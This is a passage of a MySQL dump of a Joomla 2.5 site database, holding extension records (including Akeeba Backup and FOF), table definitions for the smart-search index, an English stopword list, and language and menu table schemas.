href=\\\\\\\\\\\\\\"https:\\\\\\\\\\\\\\/\\\\\\\\\\\\\\/www.akeebabackup.com\\\\\\\\\\\\\\/home\\\\\\\\\\\\\\/news\\\\\\\\\\\\\\/55-general\\\\\\\\\\\\\\/1502-troubleshooting-instructions-for-feb-2013-releases.html\\\\\\\\\\\\\\"> troubleshooting page for the February 2013 releases of our components<\\\\\\\\\\\\\\/a>. Do note that these issues are only likely to affect users with old versions of PHP, Joomla! and\\\\\\\\\\\\\\/or very old versions of our components.<\\\\\\\\\\\\\\/p><h3>PHP 5.3 is now required<\\\\\\\\\\\\\\/h3><p> This version requires PHP 5.3 or later. The rationale behind this is explained in our <a href=\\\\\\\\\\\\\\"https:\\\\\\\\\\\\\\/\\\\\\\\\\\\\\/www.akeebabackup.com\\\\\\\\\\\\\\/home\\\\\\\\\\\\\\/news\\\\\\\\\\\\\\/55-general\\\\\\\\\\\\\\/1501-end-of-php52-support.html\\\\\\\\\\\\\\"> statement of mid-February 2013<\\\\\\\\\\\\\\/a>. It won''t install on hosts running PHP 5.2 or earlier. Moreover, due to the necessary Joomla! API changes found only in Joomla! 2.5.6 or later, this version will not install on Joomla! 2.5.5 or earlier versions. In any case, it will tell you exactly why it cannot be installed (minimum PHP or Joomla! version not satisfied).<\\\\\\\\\\\\\\/p><h3>Changelog<\\\\\\\\\\\\\\/h3><h4>Critical bugs and important changes<\\\\\\\\\\\\\\/h4><ul> <li>[HIGH] ANGIE: Database settings not saved when restoring sites<\\\\\\\\\\\\\\/li> <li>[HIGH] ANGIE: Failed Joomla! 3 restoration due to typo in default configuration<\\\\\\\\\\\\\\/li><\\\\\\\\\\\\\\/ul>\\\\\\"}\\"\\""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10007, 'PLG_JMONITORING_AKEEBABACKUP_TITLE', 'plugin', 'akeebabackup', 'jmonitoring', 0, 1, 1, 0, '{"legacy":false,"name":"PLG_JMONITORING_AKEEBABACKUP_TITLE","type":"plugin","creationDate":"May 2012","author":"Nicholas K. Dionysopoulos \\/ AkeebaBackup.com","copyright":"","authorEmail":"nicholas@dionysopoulos.me","authorUrl":"http:\\/\\/www.akeebabackup.com","version":"1.0","description":"PLG_JMONITORING_AKEEBABACKUP_DESCRIPTION","group":""}', '{"maxbackupperiod":"24"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10008, 'lib_fof', 'library', 'lib_fof', '', 0, 1, 1, 0, '{"legacy":false,"name":"lib_fof","type":"library","creationDate":"2012-10-20","author":"Nicholas K. Dionysopoulos \\/ AkeebaBackup.com","copyright":"(C)2011-2012 Nicholas K. Dionysopoulos","authorEmail":"nicholas@akeebabackup.com","authorUrl":"https:\\/\\/www.akeebabackup.com","version":"rev2A885DF","description":"Framework-on-Framework (FOF) \\u2013 A rapid component development framework extension for Joomla!","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10009, 'AkeebaStrapper', 'file', 'files_strapper', '', 0, 1, 0, 0, '{"legacy":false,"name":"AkeebaStrapper","type":"file","creationDate":"July 2012","author":"Nicholas K. Dionysopoulos","copyright":"(C) 2012 Akeeba Ltd.","authorEmail":"nicholas@dionysopoulos.me","authorUrl":"https:\\/\\/www.akeebabackup.com","version":"1.0.0","description":"Namespaced jQuery, jQuery UI and Bootstrap for Akeeba products.","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(436, 'plg_system_languagecode', 'plugin', 'languagecode', 'system', 0, 0, 1, 0, '{"legacy":false,"name":"plg_system_languagecode","type":"plugin","creationDate":"November 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SYSTEM_LANGUAGECODE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 10, 0),
(437, 'plg_quickicon_joomlaupdate', 'plugin', 'joomlaupdate', 'quickicon', 0, 1, 1, 1, '{"legacy":false,"name":"plg_quickicon_joomlaupdate","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_QUICKICON_JOOMLAUPDATE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(438, 'plg_quickicon_extensionupdate', 'plugin', 'extensionupdate', 'quickicon', 0, 1, 1, 1, '{"legacy":false,"name":"plg_quickicon_extensionupdate","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_QUICKICON_EXTENSIONUPDATE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(27, 'com_finder', 'component', 'com_finder', '', 1, 1, 0, 0, '', '{"show_description":"1","description_length":255,"allow_empty_query":"0","show_url":"1","show_advanced":"1","expand_advanced":"0","show_date_filters":"0","highlight_terms":"1","opensearch_name":"","opensearch_description":"","batch_size":"50","memory_table_limit":30000,"title_multiplier":"1.7","text_multiplier":"0.7","meta_multiplier":"1.2","path_multiplier":"2.0","misc_multiplier":"0.3","stemmer":"porter_en"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(439, 'plg_captcha_recaptcha', 'plugin', 'recaptcha', 'captcha', 0, 1, 1, 0, '{"legacy":false,"name":"plg_captcha_recaptcha","type":"plugin","creationDate":"December 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_CAPTCHA_RECAPTCHA_XML_DESCRIPTION","group":""}', '{"public_key":"","private_key":"","theme":"clean"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(440, 'plg_system_highlight', 'plugin', 'highlight', 'system', 0, 1, 1, 0, '', '{}', '', '', 0, '0000-00-00 00:00:00', 7, 0),
(441, 'plg_content_finder', 'plugin', 'finder', 'content', 0, 0, 1, 0, '{"legacy":false,"name":"plg_content_finder","type":"plugin","creationDate":"December 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"1.7.0","description":"PLG_CONTENT_FINDER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(442, 'plg_finder_categories', 'plugin', 'categories', 'finder', 0, 1, 1, 0, '', '{}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(443, 'plg_finder_contacts', 'plugin', 'contacts', 'finder', 0, 1, 1, 0, '', '{}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(444, 'plg_finder_content', 'plugin', 'content', 'finder', 0, 1, 1, 0, '', '{}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(445, 'plg_finder_newsfeeds', 'plugin', 'newsfeeds', 'finder', 0, 1, 1, 0, '', '{}', '', '', 0, '0000-00-00 00:00:00', 4, 0),
(446, 'plg_finder_weblinks', 'plugin', 'weblinks', 'finder', 0, 1, 1, 0, '', '{}', '', '', 0, '0000-00-00 00:00:00', 5, 0),
(223, 'mod_finder', 'module', 'mod_finder', '', 0, 1, 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(314, 'mod_version', 'module', 'mod_version', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_version","type":"module","creationDate":"January 2012","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_VERSION_XML_DESCRIPTION","group":""}', '{"format":"short","product":"1","cache":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(28, 'com_joomlaupdate', 'component', 'com_joomlaupdate', '', 1, 1, 0, 1, '{"legacy":false,"name":"com_joomlaupdate","type":"component","creationDate":"February 2012","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.2","description":"COM_JOOMLAUPDATE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10010, 'PKG_JOOMLA', 'package', 'pkg_joomla', '', 0, 1, 1, 1, '{"legacy":false,"name":"PKG_JOOMLA","type":"package","creationDate":"2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"http:\\/\\/www.joomla.org","version":"2.5.0","description":"PKG_JOOMLA_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_filters`
--

CREATE TABLE IF NOT EXISTS `jos_finder_filters` (
  `filter_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) NOT NULL,
  `state` tinyint(1) NOT NULL DEFAULT '1',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL,
  `created_by_alias` varchar(255) NOT NULL,
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `map_count` int(10) unsigned NOT NULL DEFAULT '0',
  `data` text NOT NULL,
  `params` mediumtext,
  PRIMARY KEY (`filter_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links` (
  `link_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `route` varchar(255) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `indexdate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `md5sum` varchar(32) DEFAULT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '1',
  `state` int(5) DEFAULT '1',
  `access` int(5) DEFAULT '0',
  `language` varchar(8) NOT NULL,
  `publish_start_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_end_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `start_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `end_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `list_price` double unsigned NOT NULL DEFAULT '0',
  `sale_price` double unsigned NOT NULL DEFAULT '0',
  `type_id` int(11) NOT NULL,
  `object` mediumblob NOT NULL,
  PRIMARY KEY (`link_id`),
  KEY `idx_type` (`type_id`),
  KEY `idx_title` (`title`),
  KEY `idx_md5` (`md5sum`),
  KEY `idx_url` (`url`(75)),
  KEY `idx_published_list` (`published`,`state`,`access`,`publish_start_date`,`publish_end_date`,`list_price`),
  KEY `idx_published_sale` (`published`,`state`,`access`,`publish_start_date`,`publish_end_date`,`sale_price`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms0`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms0` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms1`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms1` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms2`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms2` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms3`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms3` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms4`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms4` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms5`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms5` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms6`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms6` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms7`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms7` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms8`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms8` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_terms9`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_terms9` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_termsa`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_termsa` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_termsb`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_termsb` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_termsc`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_termsc` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_termsd`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_termsd` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_termse`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_termse` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_links_termsf`
--

CREATE TABLE IF NOT EXISTS `jos_finder_links_termsf` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_taxonomy`
--

CREATE TABLE IF NOT EXISTS `jos_finder_taxonomy` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL,
  `state` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `access` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `ordering` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `parent_id` (`parent_id`),
  KEY `state` (`state`),
  KEY `ordering` (`ordering`),
  KEY `access` (`access`),
  KEY `idx_parent_published` (`parent_id`,`state`,`access`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `jos_finder_taxonomy`
--

INSERT INTO `jos_finder_taxonomy` (`id`, `parent_id`, `title`, `state`, `access`, `ordering`) VALUES
(1, 0, 'ROOT', 0, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_taxonomy_map`
--

CREATE TABLE IF NOT EXISTS `jos_finder_taxonomy_map` (
  `link_id` int(10) unsigned NOT NULL,
  `node_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`node_id`),
  KEY `link_id` (`link_id`),
  KEY `node_id` (`node_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_terms`
--

CREATE TABLE IF NOT EXISTS `jos_finder_terms` (
  `term_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `weight` float unsigned NOT NULL DEFAULT '0',
  `soundex` varchar(75) NOT NULL,
  `links` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`term_id`),
  UNIQUE KEY `idx_term` (`term`),
  KEY `idx_term_phrase` (`term`,`phrase`),
  KEY `idx_stem_phrase` (`stem`,`phrase`),
  KEY `idx_soundex_phrase` (`soundex`,`phrase`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_terms_common`
--

CREATE TABLE IF NOT EXISTS `jos_finder_terms_common` (
  `term` varchar(75) NOT NULL,
  `language` varchar(3) NOT NULL,
  KEY `idx_word_lang` (`term`,`language`),
  KEY `idx_lang` (`language`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `jos_finder_terms_common`
--

INSERT INTO `jos_finder_terms_common` (`term`, `language`) VALUES
('a', 'en'),
('a', 'en'),
('about', 'en'),
('about', 'en'),
('after', 'en'),
('after', 'en'),
('ago', 'en'),
('ago', 'en'),
('all', 'en'),
('all', 'en'),
('am', 'en'),
('am', 'en'),
('an', 'en'),
('an', 'en'),
('and', 'en'),
('and', 'en'),
('ani', 'en'),
('ani', 'en'),
('any', 'en'),
('any', 'en'),
('are', 'en'),
('are', 'en'),
('aren''t', 'en'),
('aren''t', 'en'),
('as', 'en'),
('as', 'en'),
('at', 'en'),
('at', 'en'),
('be', 'en'),
('be', 'en'),
('but', 'en'),
('but', 'en'),
('by', 'en'),
('by', 'en'),
('for', 'en'),
('for', 'en'),
('from', 'en'),
('from', 'en'),
('get', 'en'),
('get', 'en'),
('go', 'en'),
('go', 'en'),
('how', 'en'),
('how', 'en'),
('if', 'en'),
('if', 'en'),
('in', 'en'),
('in', 'en'),
('into', 'en'),
('into', 'en'),
('is', 'en'),
('is', 'en'),
('isn''t', 'en'),
('isn''t', 'en'),
('it', 'en'),
('it', 'en'),
('its', 'en'),
('its', 'en'),
('me', 'en'),
('me', 'en'),
('more', 'en'),
('more', 'en'),
('most', 'en'),
('most', 'en'),
('must', 'en'),
('must', 'en'),
('my', 'en'),
('my', 'en'),
('new', 'en'),
('new', 'en'),
('no', 'en'),
('no', 'en'),
('none', 'en'),
('none', 'en'),
('not', 'en'),
('not', 'en'),
('noth', 'en'),
('noth', 'en'),
('nothing', 'en'),
('nothing', 'en'),
('of', 'en'),
('of', 'en'),
('off', 'en'),
('off', 'en'),
('often', 'en'),
('often', 'en'),
('old', 'en'),
('old', 'en'),
('on', 'en'),
('on', 'en'),
('onc', 'en'),
('onc', 'en'),
('once', 'en'),
('once', 'en'),
('onli', 'en'),
('onli', 'en'),
('only', 'en'),
('only', 'en'),
('or', 'en'),
('or', 'en'),
('other', 'en'),
('other', 'en'),
('our', 'en'),
('our', 'en'),
('ours', 'en'),
('ours', 'en'),
('out', 'en'),
('out', 'en'),
('over', 'en'),
('over', 'en'),
('page', 'en'),
('page', 'en'),
('she', 'en'),
('she', 'en'),
('should', 'en'),
('should', 'en'),
('small', 'en'),
('small', 'en'),
('so', 'en'),
('so', 'en'),
('some', 'en'),
('some', 'en'),
('than', 'en'),
('than', 'en'),
('thank', 'en'),
('thank', 'en'),
('that', 'en'),
('that', 'en'),
('the', 'en'),
('the', 'en'),
('their', 'en'),
('their', 'en'),
('theirs', 'en'),
('theirs', 'en'),
('them', 'en'),
('them', 'en'),
('then', 'en'),
('then', 'en'),
('there', 'en'),
('there', 'en'),
('these', 'en'),
('these', 'en'),
('they', 'en'),
('they', 'en'),
('this', 'en'),
('this', 'en'),
('those', 'en'),
('those', 'en'),
('thus', 'en'),
('thus', 'en'),
('time', 'en'),
('time', 'en'),
('times', 'en'),
('times', 'en'),
('to', 'en'),
('to', 'en'),
('too', 'en'),
('too', 'en'),
('true', 'en'),
('true', 'en'),
('under', 'en'),
('under', 'en'),
('until', 'en'),
('until', 'en'),
('up', 'en'),
('up', 'en'),
('upon', 'en'),
('upon', 'en'),
('use', 'en'),
('use', 'en'),
('user', 'en'),
('user', 'en'),
('users', 'en'),
('users', 'en'),
('veri', 'en'),
('veri', 'en'),
('version', 'en'),
('version', 'en'),
('very', 'en'),
('very', 'en'),
('via', 'en'),
('via', 'en'),
('want', 'en'),
('want', 'en'),
('was', 'en'),
('was', 'en'),
('way', 'en'),
('way', 'en'),
('were', 'en'),
('were', 'en'),
('what', 'en'),
('what', 'en'),
('when', 'en'),
('when', 'en'),
('where', 'en'),
('where', 'en'),
('whi', 'en'),
('whi', 'en'),
('which', 'en'),
('which', 'en'),
('who', 'en'),
('who', 'en'),
('whom', 'en'),
('whom', 'en'),
('whose', 'en'),
('whose', 'en'),
('why', 'en'),
('why', 'en'),
('wide', 'en'),
('wide', 'en'),
('will', 'en'),
('will', 'en'),
('with', 'en'),
('with', 'en'),
('within', 'en'),
('within', 'en'),
('without', 'en'),
('without', 'en'),
('would', 'en'),
('would', 'en'),
('yes', 'en'),
('yes', 'en'),
('yet', 'en'),
('yet', 'en'),
('you', 'en'),
('you', 'en'),
('your', 'en'),
('your', 'en'),
('yours', 'en'),
('yours', 'en');

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_tokens`
--

CREATE TABLE IF NOT EXISTS `jos_finder_tokens` (
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `weight` float unsigned NOT NULL DEFAULT '1',
  `context` tinyint(1) unsigned NOT NULL DEFAULT '2',
  KEY `idx_word` (`term`),
  KEY `idx_context` (`context`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_tokens_aggregate`
--

CREATE TABLE IF NOT EXISTS `jos_finder_tokens_aggregate` (
  `term_id` int(10) unsigned NOT NULL,
  `map_suffix` char(1) NOT NULL,
  `term` varchar(75) NOT NULL,
  `stem` varchar(75) NOT NULL,
  `common` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `phrase` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `term_weight` float unsigned NOT NULL,
  `context` tinyint(1) unsigned NOT NULL DEFAULT '2',
  `context_weight` float unsigned NOT NULL,
  `total_weight` float unsigned NOT NULL,
  KEY `token` (`term`),
  KEY `keyword_id` (`term_id`)
) ENGINE=MEMORY DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_finder_types`
--

CREATE TABLE IF NOT EXISTS `jos_finder_types` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL,
  `mime` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `title` (`title`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_languages`
--

CREATE TABLE IF NOT EXISTS `jos_languages` (
  `lang_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `lang_code` char(7) NOT NULL,
  `title` varchar(50) NOT NULL,
  `title_native` varchar(50) NOT NULL,
  `sef` varchar(50) NOT NULL,
  `image` varchar(50) NOT NULL,
  `description` varchar(512) NOT NULL,
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `sitename` varchar(1024) NOT NULL DEFAULT '',
  `published` int(11) NOT NULL DEFAULT '0',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`lang_id`),
  UNIQUE KEY `idx_sef` (`sef`),
  UNIQUE KEY `idx_image` (`image`),
  UNIQUE KEY `idx_langcode` (`lang_code`),
  KEY `idx_ordering` (`ordering`),
  KEY `idx_access` (`access`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `jos_languages`
--

INSERT INTO `jos_languages` (`lang_id`, `lang_code`, `title`, `title_native`, `sef`, `image`, `description`, `metakey`, `metadesc`, `sitename`, `published`, `access`, `ordering`) VALUES
(1, 'en-GB', 'English (UK)', 'English (UK)', 'en', 'en', '', '', '', '', 1, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `jos_menu`
--

CREATE TABLE IF NOT EXISTS `jos_menu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `menutype` varchar(24) NOT NULL COMMENT 'The type of menu this item belongs to. FK to #__menu_types.menutype',
  `title` varchar(255) NOT NULL COMMENT 'The display title of the menu item.',
